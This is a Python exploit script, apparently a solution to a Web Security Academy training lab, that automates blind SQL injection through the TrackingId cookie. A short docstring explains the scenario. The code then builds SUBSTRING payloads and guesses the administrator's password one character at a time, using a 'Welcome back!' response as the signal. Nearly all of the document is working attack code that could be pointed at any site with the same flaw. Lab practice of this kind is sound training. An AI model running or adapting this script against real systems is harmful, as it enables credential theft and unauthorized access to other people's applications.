"""
## Scenario
```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4

# SQL query
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

> You can slowly determine the password:
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```
"""

import requests
import string
import urllib3

TRACKING_ID = "Y26HyBd75jSW42gD"
TARGET = "https://0a4e0056039e352f8051b29f007300b5.web-security-academy.net/"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

charset = string.ascii_lowercase + string.digits
charset_length = len(charset)

class BlindSQLi:
    def __init__(self, setProxy):
        self.session = requests.Session()
        if setProxy:
            self.session.proxies.update({"http":"http://127.0.0.1:8080", "https":"https://127.0.0.1:8080"}) 
        
        self.tracking_id = TRACKING_ID
        self.tracking_id_name = "TrackingId"
    def send_payload(self, payload):
        self.session.cookies[self.tracking_id_name] = payload
        r = self.session.get(url=TARGET, verify=False)

        if "Welcome back!" in r.text:
            return True
        return False

    def check_final(self, pwd):
        payload = f"{self.tracking_id}' AND (SELECT Password FROM Users WHERE Username = 'administrator')='{pwd}"
        return self.send_payload(payload)

    def check_index(self, index, char):
        payload = f"{self.tracking_id}' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'administrator'), {index}, 1)='{char}"
        return self.send_payload(payload)

    def start(self):
        password = ""
        password_found = False
        for i in range(1,25):
            print(f"Trying index {i}")
            if password_found:
                return
            for j in range(charset_length):
                result = self.check_index(i, charset[j])
                if result:
                    print(f"Found char: {charset[j]}")
                    password += charset[j]
                    if self.check_final(password):
                        print("Password found: " + password)
                        password_found = True
                        break
        print("Password not found")

def main(setProxy):
    sql_automator = BlindSQLi(setProxy)
    sql_automator.start()

if __name__ == "__main__":
    main(False)
